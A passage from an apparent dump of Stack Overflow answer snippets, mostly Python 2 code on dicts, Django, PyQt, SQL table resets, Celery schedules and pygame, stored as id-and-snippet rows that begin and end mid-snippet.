    new_attrs[3] = new_attrs[3] &amp; ~(termios.ECHO | termios.ICANON)
    try:
        termios.tcsetattr(file.fileno(), termios.TCSADRAIN, new_attrs)
        yield
    finally:
        termios.tcsetattr(file.fileno(), termios.TCSADRAIN, old_attrs)


def main():
    print 'exit with ^C or ^D'
    with raw_mode(sys.stdin):
        try:
            while True:
                ch = sys.stdin.read(1)
                if not ch or ch == chr(4):
                    break
                print '%02x' % ord(ch),
        except (KeyboardInterrupt, EOFError):
            pass


if __name__ == '__main__':
    main()
</snippet></ROW><ROW><id>11919150</id><snippet>keys, (newkey, newvalue) = list_address[:-2], list_address[-2:]
reduce(dict.__getitem__, keys, dict_nested)[newkey] = newvalue
</snippet></ROW><ROW><id>11919150</id><snippet>dict.get</snippet></ROW><ROW><id>11919150</id><snippet>operator.getitem</snippet></ROW><ROW><id>11919150</id><snippet>reduce(lambda d,k: d.setdefault(k, {}), keys, dict_nested)[newkey] = newvalue
</snippet></ROW><ROW><id>11919150</id><snippet>from collections import MutableMapping

def set_value(d, keys, newkey, newvalue, default_factory=dict):
    """
    Equivalent to `reduce(dict.get, keys, d)[newkey] = newvalue`
    if all `keys` exists and corresponding values are of correct type
    """
    for key in keys:
        try:
            val = d[key]
        except KeyError:
            val = d[key] = default_factory()
        else:
            if not isinstance(val, MutableMapping):
                val = d[key] = default_factory()
        d = val
    d[newkey] = newvalue
</snippet></ROW><ROW><id>11919150</id><snippet>list_address = ["key1", "key1.2", "key1.2.1", "key1.2.1.1", "value"]
dict_nested = {
    "key1": {
                "key1.1": {
                            "...": "...",
                },
                "key1.2": {
                            "key1.2.1": "change_this",
                },
            },

    "key2": {
                "...": "..."
            },
}

set_value(dict_nested, list_address[:-2], *list_address[-2:])
assert reduce(dict.get, list_address[:-1], dict_nested) == list_address[-1]
</snippet></ROW><ROW><id>11919150</id><snippet>&gt;&gt;&gt; from collections import OrderedDict
&gt;&gt;&gt; d = OrderedDict()
&gt;&gt;&gt; set_value(d, [], 'a', 1, OrderedDict) # non-existent key
&gt;&gt;&gt; d.items()
[('a', 1)]
&gt;&gt;&gt; set_value(d, 'b', 'a', 2) # non-existent intermediate key
&gt;&gt;&gt; d.items()
[('a', 1), ('b', {'a': 2})]
&gt;&gt;&gt; set_value(d, 'a', 'b', 3) # wrong intermediate type
&gt;&gt;&gt; d.items()
[('a', {'b': 3}), ('b', {'a': 2})]
&gt;&gt;&gt; d = {}
&gt;&gt;&gt; set_value(d, 'abc', 'd', 4)
&gt;&gt;&gt; reduce(dict.get, 'abcd', d) == d['a']['b']['c']['d'] == 4
True
&gt;&gt;&gt; from collections import defaultdict
&gt;&gt;&gt; autovivify = lambda: defaultdict(autovivify)
&gt;&gt;&gt; d = autovivify()
&gt;&gt;&gt; set_value(d, 'abc', 'd', 4)
&gt;&gt;&gt; reduce(dict.get, 'abcd', d) == d['a']['b']['c']['d'] == 4
True
&gt;&gt;&gt; set_value(1, 'abc', 'd', 4) #doctest:+IGNORE_EXCEPTION_DETAIL
Traceback (most recent call last):
...
TypeError:
&gt;&gt;&gt; set_value([], 'abc', 'd', 4) #doctest:+IGNORE_EXCEPTION_DETAIL
Traceback (most recent call last):
...
TypeError:
&gt;&gt;&gt; L = [10]
&gt;&gt;&gt; set_value(L, [0], 2, 3)
&gt;&gt;&gt; L
[{2: 3}]
</snippet></ROW><ROW><id>11919200</id><snippet>import datetime

def minimalist_xldate_as_datetime(xldate, datemode):
    # datemode: 0 for 1900-based, 1 for 1904-based
    return (
        datetime.datetime(1899, 12, 30)
        + datetime.timedelta(days=xldate + 1462 * datemode)
    )
</snippet></ROW><ROW><id>11919568</id><snippet>mock</snippet></ROW><ROW><id>11919568</id><snippet>urllib2.urlopen</snippet></ROW><ROW><id>11919723</id><snippet>dev_appserver.py</snippet></ROW><ROW><id>11919723</id><snippet>dev_appserver.py --port=8888 .</snippet></ROW><ROW><id>11919723</id><snippet>.</snippet></ROW><ROW><id>11919764</id><snippet>scripts</snippet></ROW><ROW><id>11919764</id><snippet>entry_points/console_scripts</snippet></ROW><ROW><id>11919797</id><snippet>Counter</snippet></ROW><ROW><id>11919797</id><snippet>from collections import Counter
x=raw_input('enter line\n')
if x.strip():
    x=x.split()
    count=Counter(x)
    dic=dict(count)
    print dic
else:
    print 'you entered nothing'
</snippet></ROW><ROW><id>11919797</id><snippet>&gt;&gt;&gt; 
enter line
cat cat spam eggs foo foo bar bar bar foo
{'eggs': 1, 'foo': 3, 'bar': 3, 'cat': 2, 'spam': 1}
</snippet></ROW><ROW><id>11919797</id><snippet>Counter</snippet></ROW><ROW><id>11919797</id><snippet>sets</snippet></ROW><ROW><id>11919797</id><snippet>dic= {}
x = raw_input('Enter line:')
if x.strip():
    p = x.split()
    for x in set(p):   #set(p) contains only unique elements of p
        dic[x]=p.count(x)
    print dic
else:
    print 'you entered nothing'
</snippet></ROW><ROW><id>11919797</id><snippet>&gt;&gt;&gt; 
Enter line: cat cat spam eggs foo foo bar bar bar foo
{'eggs': 1, 'foo': 3, 'bar': 3, 'cat': 2, 'spam': 1}
</snippet></ROW><ROW><id>11919821</id><snippet>&gt;&gt;&gt; class A(object):
...   pass
...
&gt;&gt;&gt; class B(object):
...   pass
...
&gt;&gt;&gt; a = A()
&gt;&gt;&gt; type(a)
&lt;class '__main__.A'&gt;

&gt;&gt;&gt; a.__class__ = B
&gt;&gt;&gt; type(a)
&lt;class '__main__.B'&gt;

&gt;&gt;&gt; a.__class__ = int
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: __class__ assignment: only for heap types
</snippet></ROW><ROW><id>11919821</id><snippet>__slots__</snippet></ROW><ROW><id>11920035</id><snippet>lib/</snippet></ROW><ROW><id>11920035</id><snippet>sys.path</snippet></ROW><ROW><id>11920035</id><snippet>lib.help</snippet></ROW><ROW><id>11920085</id><snippet>{ }</snippet></ROW><ROW><id>11920085</id><snippet>existingVideo = self.request.root.db.videos.find_one( 
{ '$or' : 
   [ 
     { '_id' : ObjectId( video["serverVideoID"] ) 
     } , 
     {'$and' : 
           [ { '_id' : serverAuthorID } , { 'clientGUID' : video['clientGUID'] } 
           ] 
     } 
   ] 
})
</snippet></ROW><ROW><id>11920203</id><snippet>from BeautifulSoup import BeautifulSoup

soup = BeautifulSoup('&lt;textarea name="classified_description"&gt;&lt;/textarea&gt;')
soup.find('textarea', {'name': 'classified_description'}).insert(0, 'value')
assert str(soup) == '&lt;textarea name="classified_description"&gt;value&lt;/textarea&gt;'
</snippet></ROW><ROW><id>11920552</id><snippet>kurs = '252'
</snippet></ROW><ROW><id>11920552</id><snippet>for i in range(10):
    ...................
    ...................
    kurs = "%i.png" % i
    plt.savefig(kurs, format='png')
</snippet></ROW><ROW><id>11920618</id><snippet>path_to_myproject = os.path.abspath(__file__)
</snippet></ROW><ROW><id>11920618</id><snippet>path_to_myproject_css = path_to_myproject.replace("/__init__.py", "/myproject_style.css")
</snippet></ROW><ROW><id>11920726</id><snippet>\</snippet></ROW><ROW><id>11920726</id><snippet>value = (get_row_data(original_parameters)
        .refine_data(leval=3)
        .transfer_to_style_c())
</snippet></ROW><ROW><id>11920726</id><snippet>\</snippet></ROW><ROW><id>11920726</id><snippet>message = ("This is a very long"
           " one-line message put on many"
           " source lines.")
</snippet></ROW><ROW><id>11920757</id><snippet>&gt;&gt;&gt; import filecmp
&gt;&gt;&gt; filecmp.cmp('file1.txt', 'file1.txt')
True
</snippet></ROW><ROW><id>11920757</id><snippet>True</snippet></ROW><ROW><id>11921016</id><snippet>and</snippet></ROW><ROW><id>11921016</id><snippet>or</snippet></ROW><ROW><id>11921016</id><snippet>&gt;&gt;&gt; 0 and 'string'
0
&gt;&gt;&gt; 1 and 'string'
'string'
&gt;&gt;&gt; 'string' or 10
'string'
&gt;&gt;&gt; '' or 10
10
</snippet></ROW><ROW><id>11921016</id><snippet>not</snippet></ROW><ROW><id>11921241</id><snippet>from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
msg = MIMEMultipart()
msg.attach(MIMEText(file("/home/myuser/sample.pdf").read())
</snippet></ROW><ROW><id>11921241</id><snippet>import smtplib
mailer = smtplib.SMTP()
mailer.connect()
mailer.sendmail(from_, to, msg.as_string())
mailer.close()
</snippet></ROW><ROW><id>11921248</id><snippet>import unittest

class MyTest(unittest.TestCase):
    def test_example(self):
        self.assertTrue(x)
</snippet></ROW><ROW><id>11921248</id><snippet>self.failUnless("foo" in ret)</snippet></ROW><ROW><id>11921276</id><snippet>from copy import copy

class MetaStruct(type):
    def __init__(cls, name, bases, cls_dict):
        try:
            fields = cls_dict['fields']
        except KeyError:
            raise TypeError("No 'fields' attribute defined in class " + `name`)

        # field names may be separated by whitespace and/or commas
        fields = fields.replace(',', ' ').split()
        del cls_dict['fields']  # keep out of class instances

        if 'default_field_value' not in cls_dict:
            default_field_value = None  # default default field value
        else:
            default_field_value = cls_dict['default_field_value']
            del cls_dict['default_field_value']   # keep out of class instances

        super(MetaStruct, cls).__init__(name, bases, cls_dict)

        def __init__(self, **kwds):
            """ __init__() for class %s """ % name
            self.__dict__.update(zip(fields, [copy(default_field_value)
                                                  for _ in xrange(len(fields))]))
            self.__dict__.update(**kwds)

        def __setattr__(self, field, value):
            """ Prevents new field names from being added after creation. """
            if field in self.__dict__:
                self.__dict__[field] = value  # avoid recursion!
            else:
                raise AttributeError('Can not add field %r to instance of %r' %
                                     (field, name))
        # add defined methods to class instance
        setattr(cls, '__init__', __init__)
        setattr(cls, '__setattr__', __setattr__)
</snippet></ROW><ROW><id>11921276</id><snippet>new</snippet></ROW><ROW><id>11921276</id><snippet>-&gt;</snippet></ROW><ROW><id>11921276</id><snippet># sample usage
class SWF_RGBA(object):
    __metaclass__ = MetaStruct
    fields = 'red, green, blue, alpha'
    default_field_value = 0  # otherwise would be None

c1 = SWF_RGBA()
print vars(c1)  # {'blue': 0, 'alpha': 0, 'green': 0, 'red': 0}
c2 = SWF_RGBA(red=1, blue=4)
print vars(c2)  # {'blue': 4, 'green': 0, 'alpha': 0, 'red': 1}
</snippet></ROW><ROW><id>11921276</id><snippet>None</snippet></ROW><ROW><id>11921276</id><snippet>print c2.blue  # 4
c2.green = 3  # assign a new value to existing green attribute
</snippet></ROW><ROW><id>11921276</id><snippet>c2.bogus = 42  # AttributeError: Can not add field 'bogus' to instance of 'SWF_RGBA'
</snippet></ROW><ROW><id>11921372</id><snippet>charset_error</snippet></ROW><ROW><id>11921372</id><snippet>ignore</snippet></ROW><ROW><id>11921410</id><snippet>TRUNCATE TABLE asin_one_time_only</snippet></ROW><ROW><id>11921410</id><snippet>DELETE FROM asin_one_time_only</snippet></ROW><ROW><id>11921410</id><snippet>ALTER TABLE asin_one_time_only auto_increment=1</snippet></ROW><ROW><id>11921410</id><snippet>LOCK TABLES asin_one_time_only READ;
SELECT asin FROM asin_one_time_only;
-- minimize the possibility of someone writing to the table in-between
-- an "UNLOCK TABLES" and a "LOCK TABLES" by just issuing a new LOCK TABLES
-- I am not 100% sure that MySQL will do this atomically, so there is a
-- possibility that you may delete a row that was not read.
-- If this is unacceptable, then use a "LOCK TABLES asin_one_time_only WRITE"
-- from the very beginning.
LOCK TABLES asin_one_time_only WRITE;
DELETE FROM asin_one_time_only;
ALTER TABLE asin_one_time_only auto_increment=1;
UNLOCK TABLES;
</snippet></ROW><ROW><id>11921428</id><snippet>class FirstLoginCheckMiddleware(object):
    def process_request(self, request):

        is_form_page = request.path in (
            settings.FORM_PAGE
        )

        if (not is_form_page) and request.user.is_authenticated() and (not request.user.profile.filled_out_the_form):
            return HttpResponseRedirect(settings.FORM_PAGE)
        return None
</snippet></ROW><ROW><id>11921428</id><snippet>class UserProfile(models.Model):
     filled_out_the_form = field.BooleanField(default=False)
     # ...
</snippet></ROW><ROW><id>11921579</id><snippet>int QDialog::exec () [slot]</snippet></ROW><ROW><id>11921579</id><snippet>DialogCode</snippet></ROW><ROW><id>11921579</id><snippet>show()</snippet></ROW><ROW><id>11921579</id><snippet>import sys
from PyQt4 import QtCore, QtGui


class SearchDialog(QtGui.QDialog):

    def __init__(self, parent = None):
        QtGui.QDialog.__init__(self, parent)
        self.setWindowTitle('Search')
        self.searchEdit = QtGui.QLineEdit()
        layout = QtGui.QVBoxLayout()
        layout.addWidget(self.searchEdit)
        self.setLayout(layout)


class MainWindow(QtGui.QDialog):

    def __init__(self):
        QtGui.QDialog.__init__(self, None)
        self.resize(QtCore.QSize(320, 240))
        self.setWindowTitle('Main window')
        self.logText = QtGui.QPlainTextEdit()
        searchButton = QtGui.QPushButton('Search')
        layout = QtGui.QVBoxLayout()
        layout.addWidget(self.logText)
        layout.addWidget(searchButton)
        self.setLayout(layout)
        searchButton.clicked.connect(self.showSearchDialog)

    def showSearchDialog(self):
        searchDialog = SearchDialog(self)
        searchDialog.show()
        searchDialog.searchEdit.returnPressed.connect(self.onSearch)

    def onSearch(self):
        self.logText.appendPlainText(self.sender().text())



def main():
    app = QtGui.QApplication(sys.argv)
    mainWindow = MainWindow()
    mainWindow.show()
    app.exec_()

if __name__ == "__main__":
    main()
</snippet></ROW><ROW><id>11921658</id><snippet>fork()</snippet></ROW><ROW><id>11921658</id><snippet>child_pid = os.fork()
if child_pid == 0:
    print "This is the child."
    sys.exit(0)
print "This is the parent."
</snippet></ROW><ROW><id>11921678</id><snippet>from pandas import *
df = DataFrame([[0, 1, 1], [1, 1, 0], [1, 0, 1],], columns=['a','b','c'])

foo = []
for i in df.index:
    foo.append( df.columns[df.ix[i] == 1])
DataFrame(foo, index = df.index)
</snippet></ROW><ROW><id>11921678</id><snippet>   0  1
0  b  c
1  a  b
2  a  c
</snippet></ROW><ROW><id>11921695</id><snippet>"hello %(name)s , how are you %(name)s, welcome %(name)s" % {"name": "john"}
'hello john, how are you john, welcome john'
</snippet></ROW><ROW><id>11921737</id><snippet>attribute error</snippet></ROW><ROW><id>11921737</id><snippet>NameError</snippet></ROW><ROW><id>11921737</id><snippet>&gt;&gt;&gt; x=2
&gt;&gt;&gt; y=3
&gt;&gt;&gt; z    #z is not defined so NameError

Traceback (most recent call last):
  File "&lt;pyshell#136&gt;", line 1, in &lt;module&gt;
    z
NameError: name 'z' is not defined

&gt;&gt;&gt; def f():pass

&gt;&gt;&gt; f.x=2 #define an attribue of f
&gt;&gt;&gt; f.x
2
&gt;&gt;&gt; f.y   #f has no attribute named y

Traceback (most recent call last):
  File "&lt;pyshell#141&gt;", line 1, in &lt;module&gt;
    f.y
AttributeError: 'function' object has no attribute 'y'

&gt;&gt;&gt; import math   #a module  

&gt;&gt;&gt; math.sin(90) #sin() is an attribute of math
0.8939966636005579

&gt;&gt;&gt; math.cosx(90)  #but cosx() is not an attribute of math

Traceback (most recent call last):
  File "&lt;pyshell#145&gt;", line 1, in &lt;module&gt;
    math.cosx(90)
AttributeError: 'module' object has no attribute 'cosx'
</snippet></ROW><ROW><id>11921972</id><snippet>**</snippet></ROW><ROW><id>11921972</id><snippet>^</snippet></ROW><ROW><id>11921972</id><snippet>^</snippet></ROW><ROW><id>11921972</id><snippet>pow(x,y)</snippet></ROW><ROW><id>11921972</id><snippet>x**y</snippet></ROW><ROW><id>11922028</id><snippet>def set_pyqtproperties(klass, properties, proxy='user'):
    def make_prop(prop):        
        def property_(self):
            return getattr(getattr(self, proxy), 'get_' + prop)
        property_.__name__ = prop
        return property_

    if isinstance(properties, basestring):
       properties = properties.split()
    for prop in properties:
         setattr(klass, prop, pyqtProperty(QVariant, make_prop(prop)))
</snippet></ROW><ROW><id>11922028</id><snippet>def set_properties(properties):
    def decorator(klass):
        set_pyqtproperties(klass, properties)
        return klass
    return decorator
</snippet></ROW><ROW><id>11922028</id><snippet>@set_properties("display background")
class LightDMUser(QObject): pass
</snippet></ROW><ROW><id>11922028</id><snippet>class LightDMUser(QObject): 
    pass
LightDMUser = set_properties("display background")(LightDMUser)
</snippet></ROW><ROW><id>11922028</id><snippet>def set_properties_meta(properties):
    def meta(name, bases, attrs):
        cls = type(name, bases, attrs)
        set_pyqtproperties(cls, properties)
        return cls
    return meta
</snippet></ROW><ROW><id>11922028</id><snippet>class LightDMUser(QObject):
    __metaclass__ =  set_properties_meta("display background")
</snippet></ROW><ROW><id>11922028</id><snippet>def MetaClass(name, bases, attrs):
    cls = type(name, bases, attrs)
    set_pyqtproperties(cls, attrs.get('properties', ''))
    return cls

class LightDMUser(QObject):
    properties = "display background"
    __metaclass__ = MetaClass
</snippet></ROW><ROW><id>11922028</id><snippet>attrs</snippet></ROW><ROW><id>11922028</id><snippet>attrs[name] = value</snippet></ROW><ROW><id>11922028</id><snippet>type()</snippet></ROW><ROW><id>11922028</id><snippet>setattr(cls, name, value)</snippet></ROW><ROW><id>11922028</id><snippet>QObject.__class__ is type</snippet></ROW><ROW><id>11922028</id><snippet>def properties_mixin(classname, properties):
    #note: create a new class by whatever means necessary
    # e.g., even using exec() as namedtuple does
    # http://hg.python.org/cpython/file/3.2/Lib/collections.py#l235

    # reuse class decorator here
    return set_properties(properties)(type(classname, (), {}))
</snippet></ROW><ROW><id>11922028</id><snippet>PropertiesMixin = properties_mixin('PropertiesMixin', 'display background')
class LightDMUser(PropertiesMixin, QObject): pass
</snippet></ROW><ROW><id>11922163</id><snippet>backref</snippet></ROW><ROW><id>11922163</id><snippet>Competition.teams</snippet></ROW><ROW><id>11922163</id><snippet>class Competition(Base):
    # ...
    teams = relationship('Team', backref="competition")
</snippet></ROW><ROW><id>11922163</id><snippet>relationship</snippet></ROW><ROW><id>11922163</id><snippet>backref</snippet></ROW><ROW><id>11922163</id><snippet>backref</snippet></ROW><ROW><id>11922163</id><snippet>class Competition(Base):
    # ...
    teams = relationship('Team', backref=backref("competition", ... additional keywords ...))
</snippet></ROW><ROW><id>11922316</id><snippet>0 if True else 1 + 1 if False else 1
</snippet></ROW><ROW><id>11922316</id><snippet>(0) if (True) else ((1 + 1) if (False) else (1))
</snippet></ROW><ROW><id>11922316</id><snippet>((0) if (True) else (1)) + ((1) if (False) else (1))
</snippet></ROW><ROW><id>11922660</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; regex = re.compile(r'.+_\d+_svm\.pkl')
&gt;&gt;&gt; regex.search('anytext_1_svm.pkl') != None
True
</snippet></ROW><ROW><id>11922907</id><snippet>if bool(a) != bool(b): # a xor b
    if a:
        print "a and not b"
    else:
        print "not a and b"
</snippet></ROW><ROW><id>11922907</id><snippet>if not a and b:
  print "not a and b"
elif a and not b:
  print "a and not b"
</snippet></ROW><ROW><id>11922907</id><snippet>elif</snippet></ROW><ROW><id>11922907</id><snippet>if</snippet></ROW><ROW><id>11922942</id><snippet>&gt;&gt;&gt; tups = (('a', 1), ('b', 2), ('c', 3))

&gt;&gt;&gt; 'a' in (x[0] for x in tups)
True
&gt;&gt;&gt; 'd' in (x[0] for x in tups)
False
</snippet></ROW><ROW><id>11922942</id><snippet>a</snippet></ROW><ROW><id>11922942</id><snippet>&gt;&gt;&gt; tups = (('a', 1),('a',5), ('b', 2), ('c', 3))
&gt;&gt;&gt; gen=(x[0] for x in tups)
&gt;&gt;&gt; 'a' in gen
True
&gt;&gt;&gt; list(gen)
['a', 'b', 'c']  #this result means generator stopped at first 'a'
</snippet></ROW><ROW><id>11923051</id><snippet>AlchemyAPI.py-2.5</snippet></ROW><ROW><id>11923051</id><snippet>AlchemyAPI.py</snippet></ROW><ROW><id>11923051</id><snippet>example/AlchemyAPI.py</snippet></ROW><ROW><id>11923119</id><snippet>myPath2</snippet></ROW><ROW><id>11923119</id><snippet>import os

myPath = "\\\\192.168.1.50\\Shared"
myPath2 = "Folder2"
myFile = "1.txt"

print os.path.join(myPath, myPath2, myFile)
</snippet></ROW><ROW><id>11923119</id><snippet>\\192.168.1.50\Shared\Folder2\1.txt</snippet></ROW><ROW><id>11923119</id><snippet>import os

myPath = "C:\\Shared"
myPath2 = "\\Folder2"
myFile = "1.txt"

print os.path.join(myPath, myPath2, myFile)
</snippet></ROW><ROW><id>11923119</id><snippet>\Folder2\1.txt</snippet></ROW><ROW><id>11923125</id><snippet>p = wx.Panel(....., style=wx.SUNKEN_BORDER)
</snippet></ROW><ROW><id>11923125</id><snippet>wx.SIMPLE_BORDER
wx.RAISED_BORDER
wx.SUNKEN_BORDER
wx.NO_BORDER
</snippet></ROW><ROW><id>11923125</id><snippet>wx.Button</snippet></ROW><ROW><id>11923125</id><snippet>wx.BitmapButton</snippet></ROW><ROW><id>11923125</id><snippet>b = wx.BitmapButton(pane, -1, wx.Bitmap('buttons/my_beautiful_button.png'))
</snippet></ROW><ROW><id>11923125</id><snippet>wx.Panel</snippet></ROW><ROW><id>11923439</id><snippet>function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&amp;&amp;i&lt;a.length&amp;&amp;(x=a[i])&amp;&amp;x.oSrc;i++) x.src=x.oSrc;
}
</snippet></ROW><ROW><id>11923439</id><snippet>function MM_swapImgRestore() {{ //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&amp;&amp;i&lt;a.length&amp;&amp;(x=a[i])&amp;&amp;x.oSrc;i++) x.src=x.oSrc;
}}
</snippet></ROW><ROW><id>11923439</id><snippet>{tester}</snippet></ROW><ROW><id>11923664</id><snippet>dosomething("This says 'hello fail!'", thing3='fail!')
</snippet></ROW><ROW><id>11923685</id><snippet>lst = [237, 72, -18, 237, 236, 237, 60, -158, -273, -78, 492, 243]
min((abs(x), x) for x in lst)[1]
</snippet></ROW><ROW><id>11923685</id><snippet>min(lst, key=abs)
</snippet></ROW><ROW><id>11923784</id><snippet>flat</snippet></ROW><ROW><id>11923784</id><snippet>d</snippet></ROW><ROW><id>11923784</id><snippet>d</snippet></ROW><ROW><id>11923784</id><snippet>flat</snippet></ROW><ROW><id>11923784</id><snippet>numpy.flatiter</snippet></ROW><ROW><id>11923784</id><snippet>&gt;&gt;&gt; d = a[1:4,1:4]
&gt;&gt;&gt; dd = d.flat
&gt;&gt;&gt; dd[7] = 7
&gt;&gt;&gt; a
array([[0, 0, 0, 0, 0],
       [0, 0, 1, 0, 0],
       [0, 1, 0, 0, 0],
       [0, 0, 7, 0, 0],
       [0, 0, 0, 0, 0]])
</snippet></ROW><ROW><id>11923908</id><snippet>curses</snippet></ROW><ROW><id>11923908</id><snippet>import sys
print 'encoding =',sys.stdout.encoding
print ''.join(chr(i) for i in range(256)).decode(sys.stdout.encoding)

encoding = cp437
 ☺☻♥♦
♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼ !"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~⌂Çüéâäà
åçêëèïîìÄÅÉæÆôöòûùÿÖÜ¢£¥₧ƒáíóúñÑªº¿⌐¬½¼¡«»░▒▓│┤╡╢╖╕╣║╗╝╜╛┐└┴┬├─┼╞╟╚╔╩╦╠═╬╧╨╤╥╙╘╒╓╫╪┘┌█▄▌▐▀αßΓπΣσµτΦΘΩδ∞φε∩≡±≥≤⌠⌡÷≈°∙·√ⁿ²
■ 
</snippet></ROW><ROW><id>11923908</id><snippet>UnicodeEncodeError</snippet></ROW><ROW><id>11923908</id><snippet># coding: utf8
print u'╔═╦═╗╓─╥─╖╒═╤═╕┌─┬─┐'
print u'║ ║ ║║ ║ ║│ │ ││ │ │'
print u'╠═╬═╣╟─╫─╢╞═╪═╡├─┼─┤'
print u'║ ║ ║║ ║ ║│ │ ││ │ │'
print u'╚═╩═╝╙─╨─╜╘═╧═╛└─┴─┘'

╔═╦═╗╓─╥─╖╒═╤═╕┌─┬─┐
║ ║ ║║ ║ ║│ │ ││ │ │
╠═╬═╣╟─╫─╢╞═╪═╡├─┼─┤
║ ║ ║║ ║ ║│ │ ││ │ │
╚═╩═╝╙─╨─╜╘═╧═╛└─┴─┘
</snippet></ROW><ROW><id>11923913</id><snippet>&lt;ul&gt;
{% for key, value in linksList.items() recursive %}
    &lt;li&gt;
    {% if value is string %}
        &lt;a href="{{ value }}"&gt;{{ key }}&lt;/a&gt;
    {% else %}
        {{ key }}
        &lt;ul&gt;{{ loop(value.items()) }}&lt;/ul&gt;
    {% endif %}
    &lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
</snippet></ROW><ROW><id>11924026</id><snippet>user = models.ForeignKey(User, unique=True, blank=True, null=True, related_name="connector")
</snippet></ROW><ROW><id>11924026</id><snippet>user</snippet></ROW><ROW><id>11924026</id><snippet>UserProfile</snippet></ROW><ROW><id>11924026</id><snippet>class UserProfileForm(ModelForm):
    class Meta:
        model = UserProfile
        exclude = ("user", )
</snippet></ROW><ROW><id>11924056</id><snippet>&gt;&gt;&gt; lst = [237, 72, -18, 237, 236, 237, 60, -158, -273, -78, 492, 243]
&gt;&gt;&gt; lst.index(min(lst, key=abs))
2
</snippet></ROW><ROW><id>11924078</id><snippet>HTTPResponse</snippet></ROW><ROW><id>11924078</id><snippet>HttpResponse</snippet></ROW><ROW><id>11924078</id><snippet>from django.http import HttpResponse
</snippet></ROW><ROW><id>11924078</id><snippet>return HttpResponse(message)
</snippet></ROW><ROW><id>11924161</id><snippet>import re
for tag in soup.find_all(re.compile("^value_xxx_c_1_f_8_a_")):
    print(tag.name)
</snippet></ROW><ROW><id>11924308</id><snippet>ssh</snippet></ROW><ROW><id>11924308</id><snippet>#!/usr/bin/env ruby

host = ARGV.shift
command = ARGV.join(' ')
IO.popen("ssh #{host} \"#{command}\"") do |io|
  io.sync = true
  io.readlines.each { |line| puts line }
end
</snippet></ROW><ROW><id>11924308</id><snippet>$ ./remote.rb www.example.com ls -l
</snippet></ROW><ROW><id>11924308</id><snippet>ssh</snippet></ROW><ROW><id>11924308</id><snippet>sshd</snippet></ROW><ROW><id>11924308</id><snippet>ssh</snippet></ROW><ROW><id>11924466</id><snippet>from datetime import timedelta

CELERYBEAT_SCHEDULE = {
    "runs-every-30-seconds": {
        "task": "tasks.add",
        "schedule": timedelta(seconds=30),
        "args": (16, 16)
    },
}
</snippet></ROW><ROW><id>11924466</id><snippet>from celery.schedules import crontab

CELERYBEAT_SCHEDULE = {
    # Executes every Monday morning at 7:30 A.M
    'every-monday-morning': {
        'task': 'tasks.add',
        'schedule': crontab(hour=7, minute=30, day_of_week=1),
        'args': (16, 16),
    },
}
</snippet></ROW><ROW><id>11924616</id><snippet>request.POST.get('somefield')</snippet></ROW><ROW><id>11924616</id><snippet>models.py:

    class MyModel(models.Model):
        field1 = models.CharField(max_length=40, blank=False, null=False)
        field2 = models.CharField(max_length=60, blank=True, null=True)

forms.py:

    class MyModelForm(forms.Form):
        form_field1 = forms.CharField(max_length=40, required=True)
        form_field2 = forms.CharField(max_length=60, required=False)

views.py:

    def create_a_my_model(request):
        if request.method == 'POST':
            form = MyModelForm(request.POST)
            if form.is_valid():
                my_model = MyModel()
                my_model.field1 = form.cleaned_data.get('form_field1', 'default1')
                my_model.field2 = form.cleaned_data.get('form_field2', 'default2')
                my_model.save()
        else:        
            form = MyModelForm()
        c = { 'form' : form }
        return HttpResponse('templtate.html', c)
</snippet></ROW><ROW><id>11924616</id><snippet>model = MyModel</snippet></ROW><ROW><id>11924616</id><snippet>Meta</snippet></ROW><ROW><id>11924616</id><snippet>save</snippet></ROW><ROW><id>11924616</id><snippet>models.py:

    class MyModel(models.Model):
        field1 = models.CharField(max_length=40, blank=False, null=False)
        field2 = models.CharField(max_length=60, blank=True, null=True)

forms.py:

    class MyModelForm(forms.ModelForm):
        class Meta:
            model = MyModel

views.py:

    def create_a_my_model(request):
        if request.method == 'POST':
            form = MyModelForm(request.POST)
            if form.is_valid():
                my_model.save()
        else:        
            form = MyModelForm()
        c = { 'form' : form }
        return HttpResponse('templtate.html', c)
</snippet></ROW><ROW><id>11924616</id><snippet>form.save</snippet></ROW><ROW><id>11924616</id><snippet>form.cleaned_data</snippet></ROW><ROW><id>11924644</id><snippet>difflib.SequenceMatcher</snippet></ROW><ROW><id>11924644</id><snippet>from difflib import SequenceMatcher

s1 = "Bob's Bagel Shop"
s2 = "Bill's Bagel Shop"

matcher = SequenceMatcher(a=s1, b=s2)
match = matcher.find_longest_match(0, len(s1), 0, len(s2))
</snippet></ROW><ROW><id>11924644</id><snippet>Match(a=3, b=4, size=13)  # value that 'match' variable holds
</snippet></ROW><ROW><id>11924644</id><snippet>match.size  # 13
match.a     # 3
match.b     # 4
</snippet></ROW><ROW><id>11924653</id><snippet>while True:
    if the mouse was clicked:
        draw a circle on the screen where the mouse was clicked
</snippet></ROW><ROW><id>11924653</id><snippet>circle_x, circle_y = 10,10
while True:
    draw the circle at circle_x, circle_y

    pygame.display.update()
</snippet></ROW><ROW><id>11924653</id><snippet>circle_x, circle_y = 0,0
while True:
    # Update
    circle_x += 0.1
    circle_y += 0.1

    # Draw
    draw the circle at circle_x, circle_y
    update the display
</snippet></ROW><ROW><id>11924653</id><snippet>screen = ....
BLACK = (0,0,0) # Defines the "black" color
circle_x, circle_y = 0,0
while True:
    # Update
    circle_x += 0.1
    circle_y += 0.1

    # Draw
    screen.fill(BLACK)
    draw the circle at circle_x, circle_y
    update the display
</snippet></ROW><ROW><id>11924653</id><snippet>circles = [...list of circle positions...]
while True:
    # Update
    for circle in circles:
        ... Update the circle position...


    # Draw
    screen.fill(BLACK)
    for circle in circles:
        draw the circle at circle position # This will occur once for each circle
    update the display
</snippet></ROW><ROW><id>11924653</id><snippet>circles = []
while True:
    # event handling
    for event in pygame.event.get():
        if event.type == MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            circles.append( pos ) # Add a new circle to the list

    # Update all the circles
    # ....

    # Draw
    clear the screen
    for circle_position in circles:
